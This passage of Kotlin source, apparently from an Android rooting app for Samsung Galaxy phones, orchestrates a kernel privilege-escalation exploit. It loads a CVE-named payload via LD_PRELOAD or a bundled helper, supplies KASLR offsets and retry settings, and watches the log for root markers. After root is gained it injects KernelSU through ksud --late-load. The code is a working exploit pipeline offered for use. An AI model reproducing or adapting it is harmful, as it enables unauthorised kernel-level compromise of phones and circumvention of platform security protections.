                    runDiagnosticCommand("pkill -f '/data/local/tmp/cve.so' 2>/dev/null; pkill -f '/data/local/tmp/preload.so' 2>/dev/null; sleep 1; true", true)

                    appendLog("[Exploit] Launching via LD_PRELOAD (Shell UID 2000)...")
                    val envVars = "EXPLOIT_ATTEMPTS=24 P0_ATTEMPT_TIMEOUT_SEC=20 $helperCmd"
                    val kaslrEnv = if (kaslr.isNotEmpty()) "SLIDE_P0_OFFSET=$kaslr" else ""
                    // S26 (preload v10): the validated chain runs inside a live `sh`
                    // (LD_PRELOAD=... sh) — the payload re-execs ROOT_STAGE on sh and its
                    // pipe race needs a host that stays alive. Other profiles keep /system/bin/true.
                    val isS26 = profile.name.startsWith("S26")
                    val host = if (isS26) "sh -c 'sleep 300'" else "/system/bin/true"
                    val cmdString = listOf(envVars.trim(), kaslrEnv, "LD_PRELOAD=/data/local/tmp/cve.so", host, "> $logFilePath 2>&1 & echo \$! > /data/local/tmp/exploit.pid")
                        .filter { it.isNotBlank() }.joinToString(" ")
                    appendLog("[CMD] $cmdString")
                    launchCmd = cmdString
                }

                appendLog("[Logs] Real-time monitoring (Timeout: 15 min)...")
                var lastLog = ""
                var attempts = 0

                var finalLog = ""
                var hostPid = ""
                var pidReadTries = 0
                var epermSeen = false
                while (true) {
                val rc = runDiagnosticCommand(launchCmd, true)
                appendLog("[Exploit] Launch rc=$rc")
                while (attempts < 3600) {
                    attempts++; delay(250)
                    val currentLog = executeCommandAndReturnOutput("cat $logFilePath 2>/dev/null", true)
                    if (currentLog.length > lastLog.length) { appendLog(currentLog.substring(lastLog.length).trim()); lastLog = currentLog }
                    
                    // Succès UNIQUEMENT sur les deux marqueurs exacts du supervisor
                    // (un simple "complete" mid-log comme "wake=1 complete=1" ne compte pas)
                    if (currentLog.contains("done=1 root=1") && currentLog.contains("exploit completed attempt=")) { success = true; break }
                    if (currentLog.contains("pipe overwrite succeeded")) { success = true; break }
                    // preload v10 (S26): marqueurs de la chaîne validée PC
                    if (currentLog.contains("Am I root? uid=0")) { success = true; break }
                    if (currentLog.contains("ksud result=0")) { success = true; break }
                    if (currentLog.contains("F_SETPIPE_SZ") && currentLog.contains("Operation not permitted") && !epermSeen) {
                        epermSeen = true
                        appendLog("[!] F_SETPIPE_SZ EPERM seen (pipe page pressure) — payload retries internally.")
                    }
                    // The payload itself refuses to continue when the boot state is
                    // contaminated (leftover oracle/slab state from previous runs).
                    // Hammering more attempts on a dirty boot only burns the pipe
                    // budget: stop immediately and ask for a reboot.
                    if (currentLog.contains("oracle state dirty")) {
                        appendLog("[!] Payload reports DIRTY ORACLE STATE — this boot is contaminated.")
                        appendLog("[!] REBOOT the phone, then run ONCE. Retrying now is useless.")
                        finalStatus = "Reboot required"
                        break
                    }
                    // Procédure validée (SAVE S26U) : UN run par boot. Si le payload
                    // a déjà raté 8 tentatives internes sur CE boot, relancer ne sert
                    // à rien (l'état slab/pipe est contaminé) : on stoppe net.
                    val internalFail = Regex("pipe flag phase: attempt (\\d+) failed").findAll(currentLog)
                        .maxOfOrNull { it.groupValues[1].toIntOrNull() ?: 0 } ?: 0
                    if (internalFail >= 8 && !success) {
                        appendLog("[!] $internalFail internal attempts failed on this boot — stopping (validated procedure: ONE run per boot).")
                        appendLog("[!] REBOOT the phone, then run ONCE.")
                        finalStatus = "Reboot required"
                        break
                    }
                    if (currentLog.contains("failed") || currentLog.contains("[-] exploit")) { finalStatus = "Failed" }
                    
                    if (profile.name.startsWith("S26")) {
                        // The v10 preload hijacks the host sh in its constructor: 'sleep'
                        // NEVER runs, so pidof is useless. Track the real host pid instead.
                        if (hostPid.isEmpty() && pidReadTries < 40) {
                            pidReadTries++
                            hostPid = executeCommandAndReturnOutput("cat /data/local/tmp/exploit.pid 2>/dev/null", true).trim()
                        }
                        if (attempts > 12 && hostPid.isNotEmpty()) {
                            val alive = executeCommandAndReturnOutput("test -d /proc/$hostPid && echo a", true).trim().isNotEmpty()
                            if (!alive && !success) { appendLog("[!] Host process (pid $hostPid) died."); break }
                        }
                    } else {
                        val isAlive = executeCommandAndReturnOutput("pidof true 2>/dev/null", true).trim().isNotEmpty()
                        if (attempts > 12 && !isAlive && !success) { appendLog("[!] Process terminated early."); break }
                    }
                }

                finalLog = executeCommandAndReturnOutput("cat $logFilePath 2>/dev/null", true)
                if (finalLog.length > lastLog.length) { appendLog(finalLog.substring(lastLog.length).trim()); lastLog = finalLog }
                if (finalLog.contains("done=1 root=1") && finalLog.contains("exploit completed attempt=")) { success = true }
                if (finalLog.contains("pipe overwrite succeeded")) { success = true }
                if (finalLog.contains("Am I root? uid=0")) { success = true }
                if (finalLog.contains("ksud result=0")) { success = true }
                else if (!success) { finalStatus = if (finalLog.contains("failed")) "Failed" else "Crash" }

                if (success || finalStatus == "Reboot required") break
                if (relaunches >= maxRelaunches) break
                relaunches++
                appendLog("[Retry] No success yet — killing any leftover host and relaunching (retry $relaunches/$maxRelaunches)…")
                runDiagnosticCommand("kill -9 \$(cat /data/local/tmp/exploit.pid) 2>/dev/null; rm -f $logFilePath /data/local/tmp/exploit.pid", true)
                lastLog = ""
                attempts = 0
                hostPid = ""
                pidReadTries = 0
                // The dirty-oracle state clears itself in about a minute (measured).
                delay(60_000L)
                }

                if (!success && epermSeen && relaunches >= maxRelaunches) {
                    appendLog("[!] Pipe page budget exhausted — REBOOT the phone, then run once.")
                    finalStatus = "Reboot required"
                }

                if (success) {
                    finalStatus = "Success"
                    appendLog("[Success] Root acquired!")
                    appendLog("[Daemon] Waiting 2s for kernel to stabilize...")
                    delay(2000)
                    
                    if (profile.deviceType == "samsung" && !profile.pathCveNormal.isNullOrEmpty() && !profile.pathCveRoot.isNullOrEmpty()) {
                        appendLog("[Daemon] Injecting KernelSU via cve-2026-43499-root...")
                        val rootCmd = "/system/bin/cp /data/local/tmp/ksud /data/local/tmp/ksud-s25u-kdp && " +
                                      "/system/bin/cp /data/local/tmp/ksud /data/local/tmp/.ksud-stage && " +
                                      "/system/bin/chmod 755 /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage && " +
                                      "/data/local/tmp/ksud-s25u-kdp --late-load"
                        val injectCmd = "/data/local/tmp/cve-2026-43499-root -c '$rootCmd'"
                        appendLog("[Inject CMD] $injectCmd")
                        val injectOutput = executeCommandAndReturnOutput(injectCmd, true)
                        if (injectOutput.isNotBlank()) appendLog("[INJECT] $injectOutput")
                    } else if (profile.name.startsWith("S26")) {
                        appendLog("[Daemon] Injection already done by the preload ROOT_STAGE (cp ksud + late-load).")
                        appendLog("[Pipeline] KernelSU active (check the manager app).")
                    } else {
                        appendLog("[Daemon] Injecting KernelSU via temporary su...")
                        val rootCmd = "/system/bin/cp /data/local/tmp/ksud /data/local/tmp/ksud-s25u-kdp && " +
                                      "/system/bin/cp /data/local/tmp/ksud /data/local/tmp/.ksud-stage && " +
                                      "/system/bin/chmod 755 /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage && " +
                                      "/data/local/tmp/ksud-s25u-kdp --late-load"
                        val injectCmd = "/data/local/tmp/su -c '$rootCmd'"
                        appendLog("[Inject CMD] $injectCmd")
                        val injectOutput = executeCommandAndReturnOutput(injectCmd, true)
                        if (injectOutput.isNotBlank()) appendLog("[INJECT] $injectOutput")
                    }
                    appendLog("[Pipeline] Completed successfully!")
                } else {
                    if (finalLog.isBlank()) {
                        appendLog("[!] /data/local/tmp/exploit.log is EMPTY — the payload never started.")
                        appendLog("[!] Check the [CMD] line above and that /data/local/tmp/cve.so exists.")
                    }
                    appendLog("[Error] Exploit $finalStatus.")
                }

            } else {
                // --- MODE LOCAL INTACT (SAMSUNG) ---
                var logFilePath = ""
                val nativeLibDir = context.applicationInfo.nativeLibraryDir
                val helperFile = File(nativeLibDir, "libcve43499root.so")
                if (!helperFile.exists()) { appendLog("[Error] Helper not found"); return "Failed" }
                val localSoFile = File(context.filesDir, "cve.so")
                File(profile.pathSo).inputStream().use { i -> FileOutputStream(localSoFile).use { o -> i.copyTo(o) } }
                localSoFile.setReadable(true, false); localSoFile.setExecutable(true, false)
                logFilePath = File(context.filesDir, "exploit.log").absolutePath
                File(logFilePath).delete()
                var localRelaunches = 0
                while (true) {
                appendLog("[Exploit] Launching via libcve43499root.so...")
                val pb = ProcessBuilder(helperFile.absolutePath, "--run-payload", localSoFile.absolutePath, helperFile.absolutePath, logFilePath).redirectErrorStream(true)
                if (kaslr.isNotEmpty()) pb.environment()["SLIDE_P0_OFFSET"] = kaslr
                // Requis par le build APP du payload (root.c) : chemin absolu du
                // helper exécuté en root via umh — cf. flux officiel Root-My-Galaxy.
                pb.environment()["CVE43499_ROOT_HELPER"] = helperFile.absolutePath
                pb.environment()["EXPLOIT_ATTEMPTS"] = "24"
                pb.environment()["P0_ATTEMPT_TIMEOUT_SEC"] = "20"
                process = pb.start()

                appendLog("[Logs] Real-time monitoring (Timeout: 15 min)...")
                var lastLog = ""
                var attempts = 0
                
                while (process.isAlive && attempts < 3600) {
                    attempts++; delay(250)
                    val currentLog = if (File(logFilePath).exists()) File(logFilePath).readText() else ""
                    if (currentLog.length > lastLog.length) { appendLog(currentLog.substring(lastLog.length).trim()); lastLog = currentLog }
                    if (currentLog.contains("done=1 root=1") && currentLog.contains("exploit completed attempt=")) { success = true; break }
                    if (currentLog.contains("pipe overwrite succeeded")) { success = true; break }
                    if (currentLog.contains("failed")) { finalStatus = "Failed" }
                    if (!process.isAlive && !currentLog.contains("exploit completed")) { appendLog("[!] Process terminated early."); break }
                }

                val finalLog = if (File(logFilePath).exists()) File(logFilePath).readText() else ""
                if (finalLog.length > lastLog.length) { appendLog(finalLog.substring(lastLog.length).trim()); lastLog = finalLog }
                if (finalLog.contains("done=1 root=1") && finalLog.contains("exploit completed attempt=")) { success = true }
                if (finalLog.contains("pipe overwrite succeeded")) { success = true }
                else if (!success) { val early = process.inputStream?.bufferedReader()?.use { it.readText() }?.trim() ?: ""; if (early.isNotEmpty()) appendLog("[STDOUT] $early") }

                if (success || finalStatus == "Reboot required" || localRelaunches >= 2) break
                localRelaunches++
                appendLog("[Retry] No success yet — relaunching the payload (retry $localRelaunches/2)…")
                runCatching { process.destroyForcibly() }
                attempts = 0
                lastLog = ""
                delay(60_000L)
                }

                if (success) {
                    appendLog("[Success] Root acquired!")
                    val ksudPath = ksudPathForRun(profile)
                    val koPath = File(profile.pathKo).absolutePath
                    appendLog("[Daemon] Preparing ksud...")
                    val stageCmd = "/system/bin/mkdir -p /data/adb && /system/bin/cp $ksudPath /data/local/tmp/ksud-s25u-kdp && /system/bin/cp $ksudPath /data/local/tmp/.ksud-stage && /system/bin/cp $koPath /data/local/tmp/kernelsu.ko && /system/bin/chmod 755 /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage"
                    appendLog("[Daemon] Injecting KernelSU (--late-load)...")
                    
                    val helperPath = File(context.applicationInfo.nativeLibraryDir, "libcve43499root.so").absolutePath
                    val stagePb = ProcessBuilder(helperPath, "-c", stageCmd).redirectErrorStream(true)
                    val stageProcess = stagePb.start()
                    val stageReader = BufferedReader(InputStreamReader(stageProcess.inputStream))
                    var sLine: String?
                    while (stageReader.readLine().also { sLine = it } != null) { sLine?.let { appendLog("[STAGE] $it") } }
                    stageProcess.waitFor()

                    val latePb = ProcessBuilder(helperPath, "--late-load").redirectErrorStream(true)
                    val lateProcess = latePb.start()
                    val lateReader = BufferedReader(InputStreamReader(lateProcess.inputStream))
                    var lLine: String?
                    while (lateReader.readLine().also { lLine = it } != null) { lLine?.let { appendLog("[LATE] $it") } }
                    lateProcess.waitFor()
                    
                    appendLog("[Pipeline] Completed successfully!")
                    finalStatus = "Success"
                } else if (finalStatus != "Failed") {
                    appendLog("[Error] Exploit crashed.")
                }
                process.destroyForcibly()
            }
        } catch (e: Exception) { appendLog("[Error] ${e.localizedMessage}") }
        
        if (finalStatus == "Success") markRooted(rawProfile.name)
        // Root My Galaxy style: every run lands in a shareable .txt box.
        endRunLog(finalStatus, rawProfile.name, System.currentTimeMillis() - runStartedAt)
        return finalStatus
    }
}

/** java.lang.Process wrapper around the Shizuku IRemoteProcess binder interface. */
private class ShizukuProcessAdapter(private val remote: moe.shizuku.server.IRemoteProcess) : Process() {

    override fun getOutputStream(): java.io.OutputStream =
        android.os.ParcelFileDescriptor.AutoCloseOutputStream(remote.outputStream)

    override fun getInputStream(): java.io.InputStream =
        android.os.ParcelFileDescriptor.AutoCloseInputStream(remote.inputStream)

    override fun getErrorStream(): java.io.InputStream =
        android.os.ParcelFileDescriptor.AutoCloseInputStream(remote.errorStream)

    override fun waitFor(): Int = remote.waitFor()

    override fun exitValue(): Int = remote.exitValue()

    override fun destroy() = remote.destroy()

    override fun isAlive(): Boolean = remote.alive()

    override fun waitFor(timeout: Long, unit: java.util.concurrent.TimeUnit): Boolean =
        runCatching { remote.waitForTimeout(unit.toMillis(timeout), "MILLISECONDS") }.getOrDefault(false)
}
